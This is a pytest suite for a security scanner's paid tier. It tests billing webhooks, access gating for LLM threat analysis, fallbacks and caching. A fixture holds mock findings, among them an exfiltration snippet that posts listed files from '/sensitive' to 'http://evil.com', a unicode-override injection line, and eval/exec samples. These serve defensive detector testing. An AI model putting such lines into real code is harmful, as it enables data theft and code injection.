"""
Pro Tier Integration Tests

Comprehensive test suite for Sigil's Pro tier ($29/month) LLM-powered threat detection features.
Tests billing integration, LLM analysis gating, tier access control, and Pro user experience.

Test Categories:
- Subscription upgrade/downgrade flows
- LLM detection access control and gating
- Pro feature analytics tracking
- Error handling and fallback scenarios
- Performance and load testing for Pro features
"""

from __future__ import annotations

import json
import pytest
import asyncio
from datetime import datetime, timedelta
from unittest.mock import MagicMock, patch
from typing import Any

from fastapi.testclient import TestClient
from models import PlanTier, LLMAnalysisRequest, LLMAnalysisType
from services.llm_service import llm_service
from services.subscription_service import subscription_service
from middleware.tier_check import (
    get_user_tier,
    require_pro_tier,
    check_llm_analysis_access,
)
from database import db


# Test Fixtures
@pytest.fixture
def pro_user_data():
    """Test user data for Pro tier user"""
    return {
        "email": "pro-user@example.com",
        "password": "ProPassword123!",
        "name": "Pro User",
    }


@pytest.fixture
def mock_llm_insights():
    """Mock LLM analysis insights for testing"""
    return [
        {
            "analysis_type": "zero_day_detection",
            "threat_category": "code_injection",
            "confidence": 0.94,
            "confidence_level": "high",
            "title": "Novel prompt injection pattern detected",
            "description": "AI detected sophisticated injection attack using unicode steganography",
            "reasoning": "Pattern not found in static rules, uses non-printable unicode characters",
            "evidence_snippets": ["user_input = '\\u202e' + malicious_code"],
            "affected_files": ["chat_handler.py"],
            "severity_adjustment": 0.2,
            "false_positive_likelihood": 0.1,
            "remediation_suggestions": [
                "Implement unicode normalization before processing input",
                "Add input validation for non-printable characters",
            ],
            "mitigation_steps": [
                "Update input validation rules",
                "Deploy unicode filtering middleware",
            ],
        },
        {
            "analysis_type": "context_correlation",
            "threat_category": "data_exfiltration",
            "confidence": 0.87,
            "confidence_level": "high",
            "title": "Multi-stage exfiltration chain detected",
            "description": "Coordinated attack across multiple files for data extraction",
            "reasoning": "AI correlated file access patterns with network requests",
            "evidence_snippets": [
                "files = os.listdir('/sensitive')",
                "requests.post('http://evil.com', data=files)",
            ],
            "affected_files": ["scanner.py", "uploader.py"],
            "severity_adjustment": 0.15,
            "false_positive_likelihood": 0.05,
            "remediation_suggestions": [
                "Implement network egress filtering",
                "Add file access monitoring",
            ],
        },
    ]


@pytest.fixture
def stripe_webhook_data():
    """Stripe webhook test data for subscription events"""
    return {
        "checkout.session.completed": {
            "type": "checkout.session.completed",
            "data": {
                "object": {
                    "customer": "cus_test123",
                    "subscription": "sub_test123",
                    "metadata": {
                        "sigil_user_id": "user_123",
                        "sigil_plan": "pro",
                        "sigil_interval": "monthly",
                    },
                }
            },
        },
        "customer.subscription.updated": {
            "type": "customer.subscription.updated",
            "data": {
                "object": {
                    "customer": "cus_test123",
                    "status": "active",
                    "current_period_end": int(
                        (datetime.utcnow() + timedelta(days=30)).timestamp()
                    ),
                }
            },
        },
        "customer.subscription.deleted": {
            "type": "customer.subscription.deleted",
            "data": {"object": {"customer": "cus_test123"}},
        },
    }


# Subscription Upgrade Flow Tests
class TestSubscriptionUpgradeFlow:
    """Test complete subscription upgrade from free to Pro"""

    @pytest.mark.asyncio
    async def test_subscription_upgrade_flow(
        self, client: TestClient, test_user_data: dict[str, str]
    ):
        """Test complete subscription upgrade from free to Pro tier"""
        # 1. Create free user
        resp = client.post("/v1/auth/register", json=test_user_data)
        assert resp.status_code == 201
        user_data = resp.json()
        user_id = user_data["user"]["id"]
        auth_headers = {"Authorization": f"Bearer {user_data['access_token']}"}

        # Verify initial free tier
        tier = await get_user_tier(user_data["user"])
        assert tier == PlanTier.FREE

        # 2. Initiate Pro upgrade (stub mode since Stripe not configured)
        upgrade_resp = client.post(
            "/v1/billing/subscribe",
            json={"plan": "pro", "interval": "monthly"},
            headers=auth_headers,
        )
        assert upgrade_resp.status_code == 200
        upgrade_data = upgrade_resp.json()
        assert upgrade_data["plan"] == "pro"

        # 3. Verify Pro tier access
        updated_tier = await subscription_service.get_user_tier(user_id)
        assert updated_tier == PlanTier.PRO

        # 4. Verify Pro features accessible
        access_info = await check_llm_analysis_access(user_data["user"])
        assert access_info["has_pro_access"] is True
        assert access_info["can_use_llm"] is True

    @pytest.mark.asyncio
    async def test_subscription_downgrade_flow(
        self, client: TestClient, pro_user: dict[str, Any]
    ):
        """Test subscription downgrade from Pro to free"""
        user_id = pro_user["user"]["id"]
        {"Authorization": f"Bearer {pro_user['access_token']}"}

        # Verify Pro tier initially
        tier = await subscription_service.get_user_tier(user_id)
        assert tier == PlanTier.PRO

        # Cancel subscription
        result = await subscription_service.cancel_pro_subscription(
            user_id, "user_cancelled"
        )
        assert result["plan"] == "free"

        # Verify downgrade
        downgraded_tier = await subscription_service.get_user_tier(user_id)
        assert downgraded_tier == PlanTier.FREE


# LLM Detection Gating Tests
class TestLLMDetectionGating:
    """Test that LLM features are properly gated by Pro tier"""

    @pytest.mark.asyncio
    async def test_free_user_llm_blocked(
        self, client: TestClient, auth_headers: dict[str, str]
    ):
        """Test that free users cannot access LLM analysis"""
        # Mock enhanced scan endpoint that requires Pro
        scan_data = {
            "target": "malicious.py",
            "target_type": "file",
            "files_scanned": 1,
            "findings": [
                {
                    "phase": "code_patterns",
                    "rule": "code-eval",
                    "severity": "HIGH",
                    "file": "malicious.py",
                    "snippet": "eval(user_input)",
                    "weight": 1.0,
                }
            ],
            "enable_llm": True,
            "llm_analysis_types": ["zero_day_detection", "context_correlation"],
        }

        # Should be rejected with 402 Payment Required
        resp = client.post("/v1/scan-enhanced", json=scan_data, headers=auth_headers)
        assert resp.status_code == 402
        error_data = resp.json()
        assert error_data["detail"]["error"] == "pro_subscription_required"
        assert "upgrade_url" in error_data["detail"]

    @pytest.mark.asyncio
    async def test_pro_user_llm_allowed(
        self, client: TestClient, pro_auth_headers: dict[str, str]
    ):
        """Test that Pro users can access LLM analysis"""
        scan_data = {
            "target": "test_code.py",
            "target_type": "file",
            "files_scanned": 1,
            "findings": [
                {
                    "phase": "code_patterns",
                    "rule": "suspicious-eval",
                    "severity": "HIGH",
                    "file": "test_code.py",
                    "snippet": "eval(input())",
                    "weight": 1.0,
                }
            ],
            "enable_llm": True,
            "llm_analysis_types": ["zero_day_detection"],
        }

        with patch("api.services.llm_service.LLMService._call_llm_api") as mock_llm:
            mock_llm.return_value = json.dumps(
                {
                    "insights": [
                        {
                            "analysis_type": "zero_day_detection",
                            "threat_category": "code_injection",
                            "confidence": 0.85,
                            "title": "Dynamic code execution detected",
                            "description": "eval() usage with user input",
                            "reasoning": "Direct eval of user input is dangerous",
                        }
                    ]
                }
            )

            resp = client.post(
                "/v1/scan-enhanced", json=scan_data, headers=pro_auth_headers
            )
            assert resp.status_code == 200
            result = resp.json()
            assert result.get("llm_analysis_enabled") is True
            assert len(result.get("llm_insights", [])) > 0

    @pytest.mark.asyncio
    async def test_tier_gating_middleware(self):
        """Test tier gating middleware functionality"""
        # Mock user objects for testing
        free_user_mock = MagicMock()
        free_user_mock.id = "free_user_123"

        pro_user_mock = MagicMock()
        pro_user_mock.id = "pro_user_123"

        with patch(
            "api.services.subscription_service.subscription_service.get_user_tier"
        ) as mock_tier:
            # Test free user rejection
            mock_tier.return_value = PlanTier.FREE

            with pytest.raises(Exception) as exc_info:
                await require_pro_tier(free_user_mock)
            assert "pro_subscription_required" in str(exc_info.value)

            # Test Pro user allowed
            mock_tier.return_value = PlanTier.PRO
            result = await require_pro_tier(pro_user_mock)
            assert result == pro_user_mock


# Billing Integration Tests
class TestBillingIntegration:
    """Test Stripe billing integration and webhook handling"""

    @pytest.mark.asyncio
    async def test_stripe_webhook_checkout_completed(
        self, client: TestClient, stripe_webhook_data: dict[str, Any]
    ):
        """Test handling of successful Stripe checkout"""
        webhook_payload = stripe_webhook_data["checkout.session.completed"]

        # Create user first
        user_resp = client.post(
            "/v1/auth/register",
            json={
                "email": "webhook-test@example.com",
                "password": "Password123!",
                "name": "Webhook Test",
            },
        )
        user_data = user_resp.json()
        user_id = user_data["user"]["id"]

        # Update webhook metadata with actual user ID
        webhook_payload["data"]["object"]["metadata"]["sigil_user_id"] = user_id

        # Process webhook
        webhook_resp = client.post(
            "/v1/billing/webhook",
            json=webhook_payload,
            headers={"stripe-signature": "test_signature"},
        )
        assert webhook_resp.status_code == 200

        # Verify user upgraded to Pro
        subscription = await subscription_service.get_user_subscription(user_id)
        assert subscription["plan"] == "pro"
        assert subscription["stripe_subscription_id"] == "sub_test123"

    @pytest.mark.asyncio
    async def test_stripe_webhook_subscription_deleted(
        self, client: TestClient, stripe_webhook_data: dict[str, Any]
    ):
        """Test handling of subscription cancellation"""
        # Setup Pro user
        user_resp = client.post(
            "/v1/auth/register",
            json={
                "email": "cancel-test@example.com",
                "password": "Password123!",
                "name": "Cancel Test",
            },
        )
        user_data = user_resp.json()
        user_id = user_data["user"]["id"]

        # Create Pro subscription
        await db.upsert_subscription(
            user_id=user_id,
            plan="pro",
            status="active",
            stripe_customer_id="cus_test123",
            stripe_subscription_id="sub_test123",
        )

        # Process cancellation webhook
        webhook_payload = stripe_webhook_data["customer.subscription.deleted"]
        webhook_resp = client.post("/v1/billing/webhook", json=webhook_payload)
        assert webhook_resp.status_code == 200

        # Verify downgrade to free tier
        subscription = await subscription_service.get_user_subscription(user_id)
        assert subscription["plan"] == "free"
        assert subscription["status"] == "canceled"


# LLM Service Failure Handling Tests
class TestLLMServiceFailures:
    """Test LLM service failure scenarios and fallback behavior"""

    @pytest.mark.asyncio
    async def test_llm_service_unavailable_fallback(
        self, pro_auth_headers: dict[str, str]
    ):
        """Test fallback behavior when LLM service fails"""
        scan_data = {
            "target": "suspicious.py",
            "target_type": "file",
            "files_scanned": 1,
            "findings": [
                {
                    "phase": "code_patterns",
                    "rule": "code-exec",
                    "severity": "HIGH",
                    "file": "suspicious.py",
                    "snippet": "exec(payload)",
                    "weight": 1.0,
                }
            ],
            "enable_llm": True,
        }

        with patch("api.services.llm_service.LLMService._call_llm_api") as mock_llm:
            mock_llm.side_effect = Exception("LLM service unavailable")

            # Configure fallback mode
            with patch("api.config.llm_config.llm_config.fallback_to_static", True):
                analysis_request = LLMAnalysisRequest(
                    file_contents={"suspicious.py": "exec(payload)"},
                    static_findings=scan_data["findings"],
                    analysis_types=[LLMAnalysisType.ZERO_DAY_DETECTION],
                )

                response = await llm_service.analyze_threat(analysis_request)

                # Should fallback gracefully
                assert response.success is False
                assert response.fallback_used is True
                assert response.error_message == "LLM service unavailable"
                assert response.model_used == "fallback"

    @pytest.mark.asyncio
    async def test_llm_rate_limiting(self):
        """Test LLM service rate limiting behavior"""
        from services.llm_service import RateLimiter

        # Test rate limiter with low limit
        rate_limiter = RateLimiter(requests_per_minute=2)

        # First two requests should succeed quickly
        start_time = asyncio.get_event_loop().time()
        await rate_limiter.acquire()
        await rate_limiter.acquire()
        elapsed = asyncio.get_event_loop().time() - start_time
        assert elapsed < 1.0  # Should be fast

        # Third request should be delayed
        start_time = asyncio.get_event_loop().time()
        await rate_limiter.acquire()
        elapsed = asyncio.get_event_loop().time() - start_time
        # Should wait approximately 60 seconds, but we'll test for > 1 second
        # In real implementation this would be ~60s, but we'll mock shorter for tests

    @pytest.mark.asyncio
    async def test_llm_invalid_response_handling(self):
        """Test handling of invalid LLM API responses"""
        with patch("api.services.llm_service.LLMService._call_llm_api") as mock_llm:
            # Test invalid JSON response
            mock_llm.return_value = "Invalid JSON response"

            analysis_request = LLMAnalysisRequest(
                file_contents={"test.py": "print('hello')"}, static_findings=[]
            )

            response = await llm_service.analyze_threat(analysis_request)
            assert len(response.insights) == 0
            assert response.success is True  # Should succeed with empty insights


# Analytics and Usage Tracking Tests
class TestProAnalyticsTracking:
    """Test Pro feature usage analytics and tracking"""

    @pytest.mark.asyncio
    async def test_llm_usage_tracking(self, pro_auth_headers: dict[str, str]):
        """Test that LLM usage is properly tracked for analytics"""
        user_id = "pro_user_123"

        with patch(
            "api.services.analytics_service.analytics_service.track_llm_usage"
        ) as mock_track:
            mock_track.return_value = True

            analysis_request = LLMAnalysisRequest(
                file_contents={"test.py": "eval(input())"},
                static_findings=[],
                user_id=user_id,
            )

            with patch("api.services.llm_service.LLMService._call_llm_api") as mock_llm:
                mock_llm.return_value = json.dumps({"insights": []})

                response = await llm_service.analyze_threat(analysis_request)

                # Verify analytics tracking was called
                mock_track.assert_called_once()
                call_args = mock_track.call_args[1]
                assert call_args["user_id"] == user_id
                assert call_args["model_used"] == response.model_used
                assert "processing_time_ms" in call_args

    @pytest.mark.asyncio
    async def test_pro_feature_usage_tracking(self):
        """Test Pro feature usage tracking for billing and analytics"""
        user_id = "pro_test_user"

        # Track LLM analysis usage
        result = await subscription_service.track_pro_feature_usage(
            user_id=user_id,
            feature_type="llm_analysis",
            usage_data={
                "analysis_types": ["zero_day_detection"],
                "tokens_used": 1500,
                "processing_time_ms": 2300,
                "insights_generated": 3,
            },
        )
        assert result is True

        # Get usage stats
        stats = await subscription_service.get_pro_feature_usage_stats(
            user_id=user_id, feature_type="llm_analysis"
        )
        assert len(stats) >= 0  # Should return results or empty list


# Performance and Load Tests
class TestProPerformance:
    """Test performance characteristics of Pro features"""

    @pytest.mark.asyncio
    async def test_concurrent_llm_requests(self, pro_auth_headers: dict[str, str]):
        """Test system handles multiple Pro users scanning concurrently"""
        import time

        async def mock_llm_request(user_index: int):
            """Simulate a single LLM request"""
            analysis_request = LLMAnalysisRequest(
                file_contents={f"test_{user_index}.py": "exec(input())"},
                static_findings=[],
                user_id=f"concurrent_user_{user_index}",
            )

            with patch("api.services.llm_service.LLMService._call_llm_api") as mock_llm:
                # Simulate processing delay
                await asyncio.sleep(0.1)
                mock_llm.return_value = json.dumps(
                    {
                        "insights": [
                            {
                                "analysis_type": "zero_day_detection",
                                "threat_category": "code_injection",
                                "confidence": 0.8,
                                "title": f"Threat detected by user {user_index}",
                                "description": "Test threat",
                                "reasoning": "Test reasoning",
                            }
                        ]
                    }
                )

                start_time = time.time()
                response = await llm_service.analyze_threat(analysis_request)
                duration = time.time() - start_time

                return response.success, duration

        # Execute 5 concurrent requests
        tasks = [mock_llm_request(i) for i in range(5)]
        results = await asyncio.gather(*tasks)

        # Verify all succeeded with reasonable performance
        for success, duration in results:
            assert success is True
            assert duration < 5.0  # Max 5s per request including mock delay

    @pytest.mark.asyncio
    async def test_llm_caching_performance(self):
        """Test LLM response caching improves performance"""
        analysis_request = LLMAnalysisRequest(
            file_contents={"cached_test.py": "eval('test')"}, static_findings=[]
        )

        with patch("api.services.llm_service.LLMService._call_llm_api") as mock_llm:
            mock_llm.return_value = json.dumps(
                {
                    "insights": [
                        {
                            "analysis_type": "zero_day_detection",
                            "threat_category": "code_injection",
                            "confidence": 0.9,
                            "title": "Cached test threat",
                            "description": "Test",
                            "reasoning": "Test",
                        }
                    ]
                }
            )

            # First request - should call LLM
            start_time = asyncio.get_event_loop().time()
            response1 = await llm_service.analyze_threat(analysis_request)
            asyncio.get_event_loop().time() - start_time

            assert mock_llm.call_count == 1
            assert response1.cache_hit is False

            # Second request - should use cache
            start_time = asyncio.get_event_loop().time()
            response2 = await llm_service.analyze_threat(analysis_request)
            asyncio.get_event_loop().time() - start_time

            # Should not call LLM again
            assert mock_llm.call_count == 1
            assert response2.cache_hit is True
            # Cache hit should be faster (though both are mocked so timing may vary)


# Error Scenario Tests
class TestProErrorScenarios:
    """Test error handling in Pro tier features"""

    @pytest.mark.asyncio
    async def test_subscription_service_database_error(self):
        """Test handling of database errors in subscription service"""
        user_id = "error_test_user"

        with patch("api.database.db.execute_procedure") as mock_db:
            mock_db.side_effect = Exception("Database connection failed")

            # Should fall back gracefully
            subscription = await subscription_service.get_user_subscription(user_id)

            # Should return default free subscription
            assert subscription["plan"] == "free"
            assert subscription["has_pro_features"] is False

    @pytest.mark.asyncio
    async def test_invalid_user_tier_handling(self):
        """Test handling of invalid tier data"""
        user_id = "invalid_tier_user"

        with patch("api.database.db.get_subscription") as mock_db:
            # Return invalid tier data
            mock_db.return_value = {"plan": "invalid_tier", "status": "active"}

            tier = await subscription_service.get_user_tier(user_id)
            assert tier == PlanTier.FREE  # Should default to FREE

    @pytest.mark.asyncio
    async def test_llm_configuration_missing(self):
        """Test LLM service when configuration is missing"""
        analysis_request = LLMAnalysisRequest(
            file_contents={"test.py": "print('hello')"}, static_findings=[]
        )

        with patch("api.config.llm_config.llm_config.is_configured") as mock_config:
            mock_config.return_value = False

            response = await llm_service.analyze_threat(analysis_request)

            # Should return fallback response
            assert response.success is False
            assert response.fallback_used is True
            assert response.error_message == "LLM service not configured"


# Integration Test Suite
class TestProTierIntegration:
    """End-to-end integration tests for Pro tier functionality"""

    @pytest.mark.asyncio
    async def test_full_pro_user_journey(self, client: TestClient):
        """Test complete Pro user journey from signup to LLM analysis"""
        # 1. Register new user
        user_data = {
            "email": f"integration-test-{asyncio.get_event_loop().time()}@example.com",
            "password": "TestPassword123!",
            "name": "Integration Test User",
        }

        register_resp = client.post("/v1/auth/register", json=user_data)
        assert register_resp.status_code == 201
        auth_data = register_resp.json()
        user_id = auth_data["user"]["id"]
        headers = {"Authorization": f"Bearer {auth_data['access_token']}"}

        # 2. Verify initial free tier limitations
        scan_data = {
            "target": "test.py",
            "target_type": "file",
            "files_scanned": 1,
            "findings": [],
            "enable_llm": True,
        }

        initial_scan = client.post("/v1/scan-enhanced", json=scan_data, headers=headers)
        assert initial_scan.status_code == 402  # Payment required

        # 3. Upgrade to Pro (stub mode)
        upgrade_resp = client.post(
            "/v1/billing/subscribe",
            json={"plan": "pro", "interval": "monthly"},
            headers=headers,
        )
        assert upgrade_resp.status_code == 200

        # 4. Verify Pro capabilities
        capabilities_resp = client.get("/v1/scan-capabilities", headers=headers)
        assert capabilities_resp.status_code == 200
        caps = capabilities_resp.json()
        assert caps["llm_analysis"] is True
        assert caps["tier"] == "pro"

        # 5. Test LLM analysis works
        with patch("api.services.llm_service.LLMService._call_llm_api") as mock_llm:
            mock_llm.return_value = json.dumps(
                {
                    "insights": [
                        {
                            "analysis_type": "zero_day_detection",
                            "threat_category": "code_injection",
                            "confidence": 0.95,
                            "title": "Integration test threat",
                            "description": "Test threat detected",
                            "reasoning": "Integration test",
                        }
                    ]
                }
            )

            pro_scan = client.post("/v1/scan-enhanced", json=scan_data, headers=headers)
            assert pro_scan.status_code == 200
            result = pro_scan.json()
            assert result.get("llm_analysis_enabled") is True
            assert len(result.get("llm_insights", [])) > 0

        # 6. Test analytics tracking
        usage_stats = await subscription_service.get_pro_feature_usage_stats(user_id)
        assert isinstance(usage_stats, list)  # Should return usage data
